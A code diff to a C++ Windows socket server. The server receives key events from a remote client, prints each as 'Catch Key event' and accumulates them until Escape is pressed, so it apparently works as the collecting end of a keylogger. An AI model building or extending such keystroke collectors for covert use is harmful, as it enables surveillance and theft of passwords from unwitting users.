@@ -12,6 +12,7 @@
 #include <iostream>
 #include <conio.h>
 #include "WinUser.h"
+#include <sstream>
 using namespace std;
 #pragma comment(lib, "Ws2_32.lib")
 
@@ -77,20 +78,23 @@ int main() {
         else {*/
            /* printf("Send success, send %ld bytes to server\n", BytesCount);*/
         char thanh;
+        stringstream total;
         while (true) {
             if (GetAsyncKeyState(VK_ESCAPE) & 1) {
-                break;
+                cout << total.str() << endl;
+                exit(1);
             }
                 int BytesCount = recv(clientSocket, message, 1001, 0);
-                message[strlen(message)] = '\0';
-                puts(message);
-                int a = atoi(message);
+                stringstream builder;
+                total << message << " ";
+                builder << "Catch Key event: " << message;
+                // cout << builder.str() << endl;
                 if (BytesCount == SOCKET_ERROR)
                 {
                     printf("Something wrong!\nError: %s\n", WSAGetLastError());
                 }
                 else {
-                    printf("Capture key event: %c, number:%d\n", a, a);
+                    cout << builder.str() << endl;
                 }
         }
         //}
